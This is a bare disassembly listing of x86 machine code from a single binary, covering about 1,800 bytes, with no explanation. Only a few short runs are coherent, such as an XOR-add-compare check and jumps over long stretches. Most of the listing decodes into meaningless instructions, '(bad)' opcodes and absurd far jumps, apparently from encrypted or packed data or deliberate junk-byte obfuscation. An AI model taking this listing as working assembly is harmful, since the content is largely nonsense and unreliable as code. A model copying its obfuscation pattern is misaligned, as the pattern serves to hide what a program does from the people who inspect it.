  40bf7f:	repnz lea ebx,[edi+0x7d8b5ba9]
  40bf86:	or     BYTE PTR [ebx-0x75c945c1],cl
  40bf8c:	add    BYTE PTR [eax],al
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	xchg   esp,eax
  40bfbe:	push   esp
  40bfbf:	inc    ebp
  40bfc0:	aad    0x3e
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	aad    0x24
  40bfcb:	call   0x484d6e8d
  40bfd0:	pop    esi
  40bfd1:	pop    ss
  40bfd2:	or     al,0xbe
  40bfd4:	mov    bl,0xb0
  40bfd6:	push   ss
  40bfd7:	sti    
  40bfd8:	xchg   esp,eax
  40bfd9:	dec    esp
  40bfda:	inc    eax
  40bfdb:	and    bl,bl
  40bfdd:	cmp    ah,BYTE PTR [esi*2+0x532074a0]
  40bfe4:	or     esi,ebx
  40bfe6:	aas    
  40bfe7:	lods   eax,DWORD PTR ds:[esi]
  40bfe8:	aas    
  40bfe9:	jmp    0x19a3:0x1988c1f6
  40bff0:	ret    0x4e24
  40bff3:	ficom  WORD PTR [esi]
  40bff5:	add    DWORD PTR es:[eax+0x72],edi
  40bff9:	ins    DWORD PTR es:[edi],dx
  40bffa:	inc    esi
  40bffb:	jge    0x40c06f
  40bffd:	jne    0x40bfb3
  40bfff:	mov    cl,0x41
  40c001:	test   BYTE PTR [ecx+0x28892ab5],bl
  40c007:	dec    edx
  40c008:	int    0xe4
  40c00a:	js     0x40c041
  40c00c:	lock inc eax
  40c00e:	lods   al,BYTE PTR ds:[esi]
  40c00f:	cmp    esp,edx
  40c011:	pop    eax
  40c012:	add    eax,0xdae4da61
  40c017:	mov    esi,0x59a20ff
  40c01c:	xor    al,ah
  40c01e:	sub    esp,edi
  40c020:	js     0x40c042
  40c022:	pusha  
  40c023:	stos   BYTE PTR es:[edi],al
  40c024:	mov    ah,BYTE PTR [edx-0x4a]
  40c027:	addr16 int3 
  40c029:	and    al,0xaf
  40c02b:	sahf   
  40c02c:	ss xchg esi,eax
  40c02e:	out    dx,eax
  40c02f:	mov    BYTE PTR [ebp-0x46],bl
  40c032:	addr16 imul ebx,esi,0x2a7856f5
  40c039:	jns    0x40c054
  40c03b:	xchg   ebp,eax
  40c03c:	mov    esi,0xf952b15d
  40c041:	or     al,0xc6
  40c043:	and    al,0xf
  40c045:	cmp    al,0x46
  40c047:	ror    DWORD PTR [edx+0x6b288cb8],cl
  40c04d:	push   edi
  40c04e:	and    BYTE PTR [edx],ch
  40c050:	ss push edx
  40c052:	outs   dx,DWORD PTR ds:[esi]
  40c053:	(bad)  
  40c054:	stc    
  40c055:	imul   ecx,DWORD PTR [esi+0x676a2245],0x47
  40c05c:	mov    bh,0xe2
  40c05e:	nop
  40c05f:	xchg   esp,eax
  40c060:	adc    al,0xf
  40c062:	push   0xffffffd0
  40c064:	out    0x43,eax
  40c066:	mov    ebx,0xacc39ebe
  40c06b:	jns    0x40c049
  40c06d:	pop    esp
  40c06e:	cmc    
  40c06f:	stc    
  40c070:	mov    esp,0x76c0e095
  40c075:	stc    
  40c076:	and    eax,0x42d16f2
  40c07b:	shr    BYTE PTR [edi],cl
  40c07d:	cmp    al,0xbe
  40c07f:	ror    DWORD PTR [ecx+0x22],1
  40c082:	aam    0x22
  40c084:	inc    ebp
  40c085:	bnd js 0x40c0a6
  40c088:	pop    ebp
  40c089:	mov    di,0xd695
  40c08d:	or     al,0x20
  40c08f:	and    ch,ah
  40c091:	inc    ebx
  40c092:	out    0xb7,al
  40c094:	inc    esi
  40c095:	fs sbb eax,0x7b32ac11
  40c09b:	lock js 0x40c033
  40c09e:	and    DWORD PTR [ebx+0x10],0x34
  40c0a2:	iret   
  40c0a3:	add    edi,esp
  40c0a5:	jnp    0x40c0de
  40c0a7:	scas   eax,DWORD PTR es:[edi]
  40c0a8:	push   ds
  40c0a9:	jns    0x40c07c
  40c0ab:	jo     0x40c111
  40c0ad:	out    0x25,eax
  40c0af:	je     0x40c10e
  40c0b1:	jo     0x40c0af
  40c0b3:	dec    ebp
  40c0b4:	xchg   esp,eax
  40c0b5:	cmp    DWORD PTR [esi],0x19
  40c0b8:	cdq    
  40c0b9:	lea    ecx,[edi-0x238ef4ab]
  40c0bf:	enter  0xd91,0x44
  40c0c3:	mov    al,0xaa
  40c0c5:	and    bl,BYTE PTR [edi-0x4a186945]
  40c0cb:	lds    esi,FWORD PTR [eax+0x70]
  40c0ce:	adc    BYTE PTR [ebx-0x63],ch
  40c0d1:	cld    
  40c0d2:	mov    ebp,0x602b6f78
  40c0d7:	inc    edx
  40c0d8:	out    0xc8,eax
  40c0da:	sbb    DWORD PTR [esi+0x56],edx
  40c0dd:	or     BYTE PTR es:[edi-0x1ff8e0c1],cl
  40c0e4:	enter  0x6d88,0x1b
  40c0e8:	mov    ebp,0xdd3d49bb
  40c0ed:	ficom  DWORD PTR [esi-0xf]
  40c0f0:	mov    eax,0xfedecddf
  40c0f5:	ret    0xb5dd
  40c0f8:	inc    esi
  40c0f9:	bt     ebx,esp
  40c0fc:	and    DWORD PTR [ecx-0x5c4d069d],0xffffffff
  40c103:	push   cs
  40c104:	cmp    eax,0x917c94e5
  40c109:	nop
  40c10a:	punpckhdq mm1,QWORD PTR [edi]
  40c10d:	mov    esp,0xc4e7b1b2
  40c112:	mov    edx,0xf321f909
  40c117:	daa    
  40c118:	xor    bl,bh
  40c11a:	inc    edi
  40c11b:	pop    eax
  40c11c:	and    edi,DWORD PTR [edi+0x408edad1]
  40c122:	mov    al,0xd8
  40c124:	js     0x40c1a4
  40c126:	ret    
  40c127:	pop    ss
  40c128:	std    
  40c129:	iret   
  40c12a:	cmp    ch,dh
  40c12c:	or     esp,DWORD PTR [edi+0x55b768ae]
  40c132:	aad    0x36
  40c134:	mov    al,ds:0x3603369b
  40c139:	dec    esp
  40c13a:	mov    eax,ds:0x5a003d10
  40c13f:	inc    eax
  40c140:	je     0x40c0f6
  40c142:	icebp  
  40c143:	push   edi
  40c144:	sbb    esp,ebp
  40c146:	pop    eax
  40c147:	int    0xaa
  40c149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c14a:	out    0x82,al
  40c14c:	jns    0x40c194
  40c14e:	(bad)  [edx+0x2db2bd3f]
  40c154:	sbb    ebx,DWORD PTR [esp+edx*2]
  40c157:	test   al,0x9f
  40c159:	inc    esi
  40c15a:	add    DWORD PTR [edx-0x7a],0xffffffa8
  40c15e:	jg     0x40c1a1
  40c160:	int    0xe3
  40c162:	into   
  40c163:	ins    DWORD PTR es:[edi],dx
  40c164:	jp     0x40c19b
  40c166:	dec    esi
  40c167:	call   0xa8b5:0xa0dbb152
  40c16e:	dec    ebp
  40c16f:	push   esi
  40c170:	push   esi
  40c171:	or     BYTE PTR [edi+ebp*1+0x4f],ch
  40c175:	scas   eax,DWORD PTR es:[edi]
  40c176:	sbb    dl,BYTE PTR [esi+0x28]
  40c179:	es ror edx,1
  40c17c:	adc    ebp,esi
  40c17e:	mov    bl,ah
  40c180:	cmc    
  40c181:	mov    ch,0x7e
  40c183:	mov    edi,0xf92304e8
  40c188:	inc    edx
  40c189:	aas    
  40c18a:	fld    QWORD PTR [ecx]
  40c18c:	aam    0xc8
  40c18e:	test   al,0x29
  40c190:	stos   DWORD PTR es:[edi],eax
  40c191:	pop    edi
  40c192:	pusha  
  40c193:	jl     0x40c12a
  40c195:	int3   
  40c196:	sub    DWORD PTR [ecx+0x3aafa745],esp
  40c19c:	cwde   
  40c19d:	repz dec edx
  40c19f:	sub    al,0x45
  40c1a1:	fwait
  40c1a2:	cmp    BYTE PTR [ebx],dh
  40c1a4:	cmp    al,BYTE PTR ds:0x3d946ff1
  40c1aa:	sbb    ebp,DWORD PTR [ecx-0x5a605a26]
  40c1b0:	lds    eax,FWORD PTR [esi-0x1d]
  40c1b3:	push   ss
  40c1b4:	stos   BYTE PTR es:[edi],al
  40c1b5:	es and eax,0x793375f6
  40c1bb:	inc    ebx
  40c1bc:	fild   WORD PTR [ecx+0x4d]
  40c1bf:	test   eax,0x5d48bb0c
  40c1c4:	shl    DWORD PTR [ebp+0x56],1
  40c1c7:	xchg   ecx,eax
  40c1c8:	dec    edx
  40c1c9:	(bad)  
  40c1ca:	cmp    al,0x9d
  40c1cc:	mov    bh,BYTE PTR [eax-0x3c2835a1]
  40c1d2:	inc    edx
  40c1d3:	cmp    eax,0x1b6031f0
  40c1d8:	retf   0x45dc
  40c1db:	push   ss
  40c1dc:	or     BYTE PTR [ecx+0x5e],al
  40c1df:	retf   
  40c1e0:	or     ch,BYTE PTR [ecx-0x2619c55]
  40c1e6:	fild   DWORD PTR [di+0x55]
  40c1ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1eb:	retf   
  40c1ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ed:	xor    al,0x1a
  40c1ef:	add    bh,BYTE PTR [edx]
  40c1f1:	mov    bh,0xe9
  40c1f3:	mov    al,0x41
  40c1f5:	cmp    esi,DWORD PTR [edi+0x3e37d59c]
  40c1fb:	xchg   ebp,eax
  40c1fc:	fwait
  40c1fd:	dec    ebx
  40c1fe:	fisttp WORD PTR [eax-0xd3c8646]
  40c204:	or     DWORD PTR [ebx],eax
  40c206:	imul   ebp,DWORD PTR [edi],0x61fe7aa9
  40c20c:	xchg   ebp,eax
  40c20d:	push   0x4e
  40c20f:	add    eax,0x47820936
  40c214:	cmp    esp,DWORD PTR [ecx+ebx*1]
  40c217:	aas    
  40c218:	mov    bh,0x26
  40c21a:	sub    ch,ch
  40c21c:	add    DWORD PTR [ebp+0x63],esi
  40c21f:	cmp    ecx,DWORD PTR [ecx+ebx*1]
  40c222:	push   ds
  40c223:	xchg   esp,eax
  40c224:	dec    ecx
  40c225:	retf   
  40c226:	or     al,BYTE PTR [ecx]
  40c228:	cli    
  40c229:	pop    edx
  40c22a:	xchg   edx,eax
  40c22b:	push   edi
  40c22c:	sbb    eax,0x34c1024d
  40c231:	add    bl,BYTE PTR [esi]
  40c233:	fwait
  40c234:	or     al,0x92
  40c236:	xor    DWORD PTR ds:0x64def4da,0x4a81e8e
  40c240:	cmp    BYTE PTR [edx+0x5c812780],dh
  40c246:	sub    BYTE PTR [ebp+esi*8-0x43bef376],0xab
  40c24e:	jno    0x40c232
  40c250:	cmp    BYTE PTR [ecx],ah
  40c252:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c254:	imul   ebx,ebx,0xffffffeb
  40c257:	(bad)  
  40c258:	(bad)  
  40c259:	sahf   
  40c25a:	rcr    DWORD PTR [esi],0xf3
  40c25d:	dec    edi
  40c25e:	scas   eax,DWORD PTR es:[edi]
  40c25f:	xchg   ecx,eax
  40c260:	mov    dh,0x15
  40c262:	mov    esi,0xfa507bfd
  40c267:	lea    ebp,[ebx+0x43]
  40c26a:	sub    eax,0x54f9cc9a
  40c26f:	mov    esp,0x3cfd6f6
  40c274:	sbb    esi,ebp
  40c276:	push   esi
  40c277:	mov    edi,0x47fa74f9
  40c27c:	ins    BYTE PTR es:[edi],dx
  40c27d:	std    
  40c27e:	push   ebx
  40c27f:	(bad)  
  40c280:	(bad)  
  40c281:	daa    
  40c282:	mov    ecx,0xbf352417
  40c287:	ror    DWORD PTR [ebx],1
  40c289:	jmp    0xb3ef:0x4ec7f0fa
  40c290:	push   edi
  40c291:	xor    al,0xc0
  40c293:	inc    esp
  40c294:	or     eax,0x9fe12323
  40c299:	shl    DWORD PTR [edi],0x8a
  40c29c:	mov    edx,0x782f2fcd
  40c2a1:	(bad)  [edi-0x6c]
  40c2a4:	mov    al,0xb3
  40c2a6:	xor    eax,0xa49818f0
  40c2ab:	inc    ebp
  40c2ac:	dec    eax
  40c2ad:	jge    0x40c32c
  40c2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2b0:	and    BYTE PTR [edi],0x81
  40c2b3:	lock mov bl,0xfe
  40c2b6:	or     BYTE PTR [edx+edx*8-0x7a],0xcf
  40c2bb:	iret   
  40c2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2bd:	inc    edi
  40c2be:	mov    DWORD PTR [ebx-0x57d97dbe],edx
  40c2c4:	mov    eax,DWORD PTR [di-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x7a],bh
  40c2e3:	cdq    
  40c2e4:	add    BYTE PTR [eax],ch
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	pop    eax
  40c2ef:	mov    al,ds:0x7842f4dc
  40c2f4:	mov    esi,cs
  40c2f6:	dec    eax
  40c2f7:	dec    ebx
  40c2f8:	xchg   esi,eax
  40c2f9:	jnp    0x40c367
  40c2fb:	ss or  al,0xc2
  40c2fe:	pop    es
  40c2ff:	repnz in eax,0x4
  40c302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c303:	in     eax,0x6b
  40c305:	aaa    
  40c306:	(bad)  
  40c307:	repz shl DWORD PTR [esi-0x70],cl
  40c30b:	iret   
  40c30c:	jns    0x40c35a
  40c30e:	into   
  40c30f:	cli    
  40c310:	mov    ds:0x1fc7e40c,eax
  40c315:	fs xor al,0xd4
  40c318:	add    al,0xa9
  40c31a:	fidivr WORD PTR [eax]
  40c31c:	add    al,0xf7
  40c31e:	mov    ebp,0xf71a4224
  40c323:	int    0x1
  40c325:	cli    
  40c326:	les    ecx,FWORD PTR [eax]
  40c328:	xchg   ebp,eax
  40c329:	pop    DWORD PTR [ecx-0xc]
  40c32c:	(bad)  
  40c32d:	fxtract 
  40c32f:	test   ch,0x28
  40c332:	es ins BYTE PTR es:[edi],dx
  40c334:	xlat   BYTE PTR ds:[ebx]
  40c335:	(bad)  
  40c336:	xor    DWORD PTR [ebp+0x2164b364],edx
  40c33c:	scas   al,BYTE PTR es:[edi]
  40c33d:	popa   
  40c33e:	call   0x616eba0
  40c343:	clc    
  40c344:	data16 adc BYTE PTR [eax*1+0x79c6b67a],ah
  40c34c:	push   ebp
  40c34d:	stos   BYTE PTR es:[edi],al
  40c34e:	push   0xaf942bea
  40c353:	push   sp
  40c355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c356:	inc    edi
  40c357:	dec    ebx
  40c358:	pusha  
  40c359:	adc    bl,BYTE PTR [eax+0x4f]
  40c35c:	pop    edx
  40c35d:	add    al,0xec
  40c35f:	outs   dx,BYTE PTR ds:[esi]
  40c360:	out    0x16,eax
  40c362:	or     bl,BYTE PTR [edx]
  40c364:	rol    DWORD PTR [ecx-0x8],cl
  40c367:	pop    ebx
  40c368:	sbb    ebx,DWORD PTR [eax+ebp*4]
  40c36b:	in     al,0x7b
  40c36d:	mov    ds:0x35786827,eax
  40c372:	pop    ebp
  40c373:	ins    BYTE PTR es:[edi],dx
  40c374:	push   0x3982c2ce
  40c379:	es xchg edi,eax
  40c37b:	ins    DWORD PTR es:[edi],dx
  40c37c:	push   ebp
  40c37d:	test   eax,0x44b8457f
  40c382:	(bad)
  40c385:	ss aad 0xdd
  40c388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c389:	icebp  
  40c38a:	hlt    
  40c38b:	inc    DWORD PTR [eax-0x28]
  40c38e:	test   al,0xd4
  40c390:	inc    ebp
  40c391:	ja     0x40c3eb
  40c393:	(bad)  [edx+0x6e]
  40c396:	xor    ebp,DWORD PTR [edx-0x70]
  40c399:	inc    eax
  40c39a:	int    0xd4
  40c39c:	xchg   ebx,eax
  40c39d:	pop    ebp
  40c39e:	fimul  WORD PTR [ebx+esi*1]
  40c3a1:	adc    al,0x44
  40c3a3:	imul   DWORD PTR [esi]
  40c3a5:	push   edi
  40c3a6:	fwait
  40c3a7:	test   eax,0xe1cf6308
  40c3ac:	jnp    0x40c3f3
  40c3ae:	aam    0x5c
  40c3b0:	cmp    BYTE PTR [ebp+0x1d],dl
  40c3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b4:	fs xchg esp,eax
  40c3b6:	out    dx,al
  40c3b7:	or     eax,0xbf7559d0
  40c3bc:	pop    ecx
  40c3bd:	dec    eax
  40c3be:	sbb    ah,BYTE PTR [edi]
  40c3c0:	add    esp,DWORD PTR [edi+edx*8+0x24]
  40c3c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3c5:	add    esi,esi
  40c3c7:	ret    
  40c3c8:	ins    DWORD PTR es:[edi],dx
  40c3c9:	mov    dl,0x64
  40c3cb:	aam    0xb8
  40c3cd:	mov    ss,WORD PTR [esi-0x7a]
  40c3d0:	dec    edx
  40c3d1:	add    ebp,edi
  40c3d3:	(bad)  
  40c3d4:	jno    0x40c3c5
  40c3d6:	fcom   DWORD PTR [eax]
  40c3d8:	push   edi
  40c3d9:	retf   0x5a64
  40c3dc:	cs enter 0x8a43,0x77
  40c3e1:	dec    edx
  40c3e2:	loopne 0x40c385
  40c3e4:	xchg   ebp,eax
  40c3e5:	and    BYTE PTR [ebp-0x1f661fd6],cl
  40c3eb:	ins    DWORD PTR es:[edi],dx
  40c3ec:	or     eax,0xe50982aa
  40c3f1:	loopne 0x40c3b5
  40c3f3:	out    0x1c,eax
  40c3f5:	sbb    al,0x3d
  40c3f7:	aaa    
  40c3f8:	inc    edi
  40c3f9:	pusha  
  40c3fa:	adc    al,0x99
  40c3fc:	pop    edi
  40c3fd:	retf   
  40c3fe:	and    eax,0x68533db7
  40c403:	jmp    0x40c390
  40c405:	xchg   BYTE PTR [esi+ecx*4],ch
  40c408:	and    DWORD PTR [eax-0x36a42675],eax
  40c40e:	(bad)  
  40c40f:	loope  0x40c415
  40c411:	popf   
  40c412:	mov    al,0x17
  40c414:	and    BYTE PTR [edi+0x2a9cf571],cl
  40c41a:	xor    dh,BYTE PTR [edi]
  40c41c:	out    dx,eax
  40c41d:	fsub   QWORD PTR [edx]
  40c41f:	dec    esp
  40c420:	popa   
  40c421:	inc    ebp
  40c422:	push   ecx
  40c423:	xor    eax,0x7b78bd33
  40c428:	test   al,0x38
  40c42a:	ds pop es
  40c42c:	jo     0x40c3e1
  40c42e:	mov    ds,WORD PTR [ecx+0x1072830e]
  40c434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c435:	fist   DWORD PTR ds:0xf528a22e
  40c43b:	iret   
  40c43c:	inc    edi
  40c43d:	pop    ss
  40c43e:	call   esi
  40c440:	jmp    0x53286eba
  40c445:	int3   
  40c446:	sbb    ebp,DWORD PTR [eax+ebx*4+0x6b]
  40c44a:	dec    edx
  40c44b:	lods   al,BYTE PTR ds:[esi]
  40c44c:	push   DWORD PTR [ecx]
  40c44e:	jp     0x40c3fc
  40c450:	rol    ebx,1
  40c452:	sub    esi,DWORD PTR [edi+0xc]
  40c455:	push   esp
  40c456:	js     0x40c494
  40c458:	push   ebp
  40c459:	mov    eax,ds:0x38aa25ac
  40c45e:	in     al,0xb2
  40c460:	ror    BYTE PTR [ecx+0x2c],cl
  40c463:	jo     0x40c4cc
  40c465:	jbe    0x40c4c5
  40c467:	mov    ecx,0xefa434a1
  40c46c:	outs   dx,DWORD PTR ds:[esi]
  40c46d:	xchg   edx,eax
  40c46e:	stos   DWORD PTR es:[edi],eax
  40c46f:	push   esp
  40c470:	cmp    DWORD PTR [ecx],eax
  40c472:	fistp  DWORD PTR [edi+0x40a59045]
  40c478:	(bad)  
  40c479:	int    0x1
  40c47b:	xor    BYTE PTR [ebp+0x7521c72d],ch
  40c481:	and    dl,BYTE PTR [esi-0x48]
  40c484:	aaa    
  40c485:	cmc    
  40c486:	sahf   
  40c487:	fidivr WORD PTR [edx]
  40c489:	cmp    al,0xaf
  40c48b:	leave  
  40c48c:	push   es
  40c48d:	jge    0x40c4ca
  40c48f:	mov    edx,DWORD PTR [bx+si+0x3ce4]
  40c494:	adc    al,0xb
  40c496:	je     0x40c44c
  40c498:	ret    0xa957
  40c49b:	xchg   edi,eax
  40c49c:	jns    0x40c4a9
  40c49e:	or     DWORD PTR [edi+0x7],eax
  40c4a1:	pop    ecx
  40c4a2:	scas   eax,DWORD PTR es:[edi]
  40c4a3:	arpl   si,di
  40c4a5:	mov    eax,0x379f7c1e
  40c4aa:	xchg   ecx,eax
  40c4ab:	pop    ss
  40c4ac:	add    BYTE PTR [eax+0x79bd78a1],0x2e
  40c4b3:	and    edx,ebx
  40c4b5:	adc    BYTE PTR [edx+0x24fe7930],al
  40c4bb:	xchg   ebp,eax
  40c4bc:	push   esp
  40c4bd:	aaa    
  40c4be:	push   eax
  40c4bf:	clc    
  40c4c0:	fldenv [eax]
  40c4c2:	out    0x44,al
  40c4c4:	push   cs
  40c4c5:	leave  
  40c4c6:	push   0x37111c3b
  40c4cb:	add    DWORD PTR [ebx+0x36],ebx
  40c4ce:	xlat   BYTE PTR ds:[ebx]
  40c4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d0:	mov    ds:0xa02908ef,eax
  40c4d5:	pop    es
  40c4d6:	mov    DWORD PTR [edx-0x75],0xe8877e58
  40c4dd:	retf   
  40c4de:	pop    esp
  40c4df:	and    dh,BYTE PTR [ebp-0x4e13d2f8]
  40c4e5:	xchg   ebx,ebp
  40c4e7:	mov    BYTE PTR [edi],ch
  40c4e9:	cld    
  40c4ea:	and    dh,ah
  40c4ec:	dec    ecx
  40c4ed:	xor    bl,BYTE PTR [esi+0x743cef10]
  40c4f3:	or     al,0xc5
  40c4f5:	dec    ebp
  40c4f6:	and    cl,BYTE PTR [ebx-0x2e]
  40c4f9:	xchg   esi,eax
  40c4fa:	inc    ebp
  40c4fb:	dec    esp
  40c4fc:	inc    edi
  40c4fd:	in     eax,dx
  40c4fe:	mov    edx,0xcb112f79
  40c503:	fld    st(7)
  40c505:	sub    eax,0xe3ee8280
  40c50a:	jmp    0x40c4d7
  40c50c:	scas   al,BYTE PTR es:[edi]
  40c50d:	ds jecxz 0x40c588
  40c510:	push   0xffffff88
  40c512:	cld    
  40c513:	sar    DWORD PTR [esi+0x1f8a1a27],cl
  40c519:	pop    edx
  40c51a:	mov    ds:0x87093e2e,al
  40c51f:	inc    ebx
  40c520:	xchg   ebx,eax
  40c521:	and    DWORD PTR [esi],0x43136f0
  40c527:	pop    esp
  40c528:	mov    esi,ebp
  40c52a:	retf   0xb8d1
  40c52d:	mov    esi,0x3ebb2fdd
  40c532:	rol    BYTE PTR [eax-0x6d],cl
  40c535:	sbb    BYTE PTR cs:[edx-0x24cc2c21],0xc4
  40c53d:	sub    BYTE PTR [edi+edx*4-0x882252f],ch
  40c544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c545:	mov    esi,0x2f96744c
  40c54a:	outs   dx,BYTE PTR ds:[esi]
  40c54b:	nop
  40c54c:	aaa    
  40c54d:	test   BYTE PTR [edi+edx*2+0x44],0xf4
  40c552:	mov    ?,eax
  40c554:	pop    edx
  40c555:	dec    eax
  40c556:	adc    ebx,edx
  40c558:	lods   eax,DWORD PTR ds:[esi]
  40c559:	push   0xffffff97
  40c55b:	mov    ?,WORD PTR [edx+ebx*2+0xa97d1e6]
  40c562:	mov    edx,0xd580a023
  40c567:	inc    ebp
  40c568:	xchg   ebx,eax
  40c569:	popf   
  40c56a:	inc    esi
  40c56b:	and    BYTE PTR [ebx-0x9],dl
  40c56e:	in     eax,0x1
  40c570:	mov    eax,0xb6648bae
  40c575:	push   ds
  40c576:	xor    ah,BYTE PTR [esi-0xc]
  40c579:	cmovbe edx,DWORD PTR [edi]
  40c57c:	es in  al,0xda
  40c57f:	sti    
  40c580:	or     al,0xcc
  40c582:	jb     0x40c52d
  40c584:	add    edi,esi
  40c586:	xchg   edx,eax
  40c587:	lahf   
  40c588:	in     al,dx
  40c589:	sbb    eax,DWORD PTR [ecx-0x65]
  40c58c:	shl    BYTE PTR [esi-0x51],0x6b
  40c590:	xor    esp,ebx
  40c592:	jmp    0x66e0e0a2
  40c597:	push   edi
  40c598:	inc    ebp
  40c599:	mov    ds:0xf955af53,eax
  40c59e:	push   ss
  40c59f:	ret    
  40c5a0:	cmp    edx,DWORD PTR [esi]
  40c5a2:	jb     0x40c5d9
  40c5a4:	and    eax,0x49e4be57
  40c5a9:	jo     0x40c586
  40c5ab:	sbb    bl,BYTE PTR [edi+0x72]
  40c5ae:	and    eax,0x7b217549
  40c5b3:	xor    al,0x1e
  40c5b5:	or     al,0xab
  40c5b7:	fs cmp al,0xb0
  40c5ba:	enter  0x6055,0x4c
  40c5be:	in     al,dx
  40c5bf:	push   cs
  40c5c0:	push   0x5fcd8c8e
  40c5c5:	dec    ecx
  40c5c6:	xchg   esi,ebp
  40c5c8:	dec    edi
  40c5c9:	retf   
  40c5ca:	pop    ecx
  40c5cb:	rcr    cl,cl
  40c5cd:	test   al,0xc1
  40c5cf:	push   0xfffffff2
  40c5d1:	mov    fs,edx
  40c5d3:	dec    edx
  40c5d4:	xor    esi,DWORD PTR [ecx]
  40c5d6:	rcr    BYTE PTR [edi-0x2fa284aa],0x13
  40c5dd:	imul   edx,edi,0xffffffac
  40c5e0:	mov    dl,0x11
  40c5e2:	rol    BYTE PTR [esi+0x16],1
  40c5e5:	dec    ebx
  40c5e6:	aaa    
  40c5e7:	mov    esi,0x3366b573
  40c5ec:	sti    
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x2fd2d2f7
  40c613:	ret    
  40c614:	repz aam 0x36
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	xchg   edi,eax
  40c61f:	(bad)
  40c623:	or     ch,BYTE PTR [eax]
  40c625:	dec    esp
  40c626:	in     eax,0x66
  40c628:	retf   
  40c629:	and    bh,BYTE PTR [ecx-0x38]
  40c62c:	pop    eax
  40c62d:	mov    ebx,0xf4a39ce8
  40c632:	push   eax
  40c633:	mul    BYTE PTR [esi+0x49]
  40c636:	and    eax,DWORD PTR [ebx+esi*1-0x46591807]
  40c63d:	pusha  
  40c63e:	test   DWORD PTR [edi],eax
  40c640:	pop    ebx
  40c641:	lods   al,BYTE PTR ds:[esi]
  40c642:	pop    esi
  40c643:	mov    ebx,0xc8f6e0d5
  40c648:	in     al,dx
  40c649:	jmp    0x50cd1ff3
  40c64e:	sbb    BYTE PTR [esi+0x6f],dh
  40c651:	aad    0xa6
  40c653:	stos   DWORD PTR es:[edi],eax
  40c654:	sub    ch,BYTE PTR [eax+ebp*8+0x309d9343]
  40c65b:	das    
  40c65c:	xchg   ebp,ecx
  40c65e:	sbb    BYTE PTR [esi],bh
  40c660:	loop   0x40c5ea
  40c662:	dec    esi
  40c663:	outs   dx,DWORD PTR ds:[esi]
  40c664:	dec    ecx
  40c665:	xchg   esi,eax
  40c666:	ror    BYTE PTR [edi+0x5a],1
  40c669:	add    eax,esp
  40c66b:	mov    eax,0xcbd05027
  40c670:	jle    0x40c69b
  40c672:	pop    edx
  40c673:	not    BYTE PTR [edi]
  40c675:	and    BYTE PTR [ebp+0x18328111],cl
  40c67b:	push   ds
  40c67c:	inc    esi
  40c67d:	mov    ch,ch
  40c67f:	adc    al,0x1e
  40c681:	inc    ecx
  40c682:	(bad)
  40c685:	inc    esp
  40c686:	test   BYTE PTR [edx+0x7a3677f7],0xc9
  40c68d:	adc    BYTE PTR [ebp-0x5400c0b5],al
  40c693:	jmp    0x96d6:0x8dee6b8d
  40c69a:	lock dec esi
  40c69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c69d:	sbb    DWORD PTR [ebx+0x4d],edi
  40c6a0:	pop    edx
  40c6a1:	repnz dec ecx
  40c6a3:	fwait
  40c6a4:	adc    ah,BYTE PTR [edi]
  40c6a6:	in     al,dx
  40c6a7:	pushf  
  40c6a8:	pop    ebp
  40c6a9:	cdq    
  40c6aa:	test   DWORD PTR [edx],0xb7ee27a9
  40c6b0:	inc    ebp
  40c6b1:	and    DWORD PTR [esp],ebp
  40c6b4:	adc    esi,DWORD PTR [ebx+0xf699d08]
  40c6ba:	into   
  40c6bb:	mov    ch,0x91
  40c6bd:	test   BYTE PTR [edx+0x47cc6b1f],dl
  40c6c3:	mov    ecx,0xafbbbeb1
  40c6c8:	das    
  40c6c9:	and    edx,DWORD PTR [ecx]
  40c6cb:	and    BYTE PTR [ebp+ebp*8+0x5a],dl
  40c6cf:	ds pop ebx
  40c6d1:	dec    esi
